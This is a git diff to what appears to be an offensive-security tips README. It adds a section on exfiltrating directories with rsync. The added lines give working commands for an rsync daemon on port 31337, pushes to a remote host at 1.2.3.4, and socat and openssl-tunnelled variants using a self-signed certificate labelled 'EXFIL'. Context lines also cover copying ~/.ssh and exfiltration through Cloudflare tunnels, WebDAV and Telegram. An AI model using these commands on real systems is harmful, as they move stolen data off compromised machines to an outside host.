@@ -41,6 +41,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
    1. [File transfer using HTTP](#http)
    1. [File transfer without curl](#burl)
+   2. [File transfer using rsync](#rsync)
    1. [File transfer to public dump sites](#trans) 
    1. [File transfer using WebDAV](#webdav)
    1. [File transfer to Telegram](#tg) 
@@ -931,10 +932,50 @@ transfer ~/.ssh       # An entire directory
 ```
 A list of our [favorite public upload sites](#cloudexfil).
 
-<a id="webdav"></a>
-### 4.viii. File transfer - using WebDAV
+<a id="rsync"></a>
+### 4.viii. File transfer - using rsync
 
-On your workstation (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
+Ideal for synchonizing large amount of directories or re-starting broken transfers. The example transfers the directory '*warez*' to the Receiver using a single TCP connection from the Sender to the Receiver.
+
+Receiver:
+```
+echo -e "[up]\npath=upload\nread only=false\nuid=$(id -u)\ngid=$(id -g)" >r.conf
+mkdir upload
+rsync --daemon --port=31337 --config=r.conf --no-detach
+```
+
+Sender:
+```
+rsync -av warez rsync://1.2.3.4:31337/up
+```
+
+The same encrypted (OpenSSL):
+
+Receiver:
+```
+openssl req -subj '/CN=thc/O=EXFIL/C=XX' -new -newkey rsa:2048 -sha256 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
+cat ssl.key ssl.crt >ssl.pem
+rm -f ssl.key
+mkdir upload
+socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.crt EXEC:"rsync --server -logtprR --safe-links --partial upload"
+```
+
+Sender:
+```
+# Copy the ssl.pem and ssl.crt from the Receiver to the Sender:
+# Using rsync + socat-ssl
+rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:1.2.3.4:31337,cert=ssl.pem,cafile=ssl.crt,verify=0' #" -- warez  0:
+
+# Using rsync + openssl
+rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername thc -cert ssl.pem -CAfile ssl.crt -quiet 2>/dev/null' #" -- warez  0:
+```
+
+(To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)).
+
+<a id="webdav"></a>
+### 4.ix. File transfer - using WebDAV
+
+On the receiver (e.g. segfault.net) start a Cloudflare-Tunnel and WebDAV:
 ```sh
 cloudflared tunnel --url localhost:8080 &
 # [...]
@@ -969,7 +1010,7 @@ net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ```
 
 <a id="tg"></a>
-### 4.ix. File transfer to Telegram
+### 4.x. File transfer to Telegram
 
 There are [zillions of upload services](#cloudexfil) but TG is a neat alternative. Get a _TG-Bot-Token_ from the [TG BotFather](https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token). Then create a new TG group and add your bot to the group. Retrieve the _chat_id_ of that group:
 ```sh
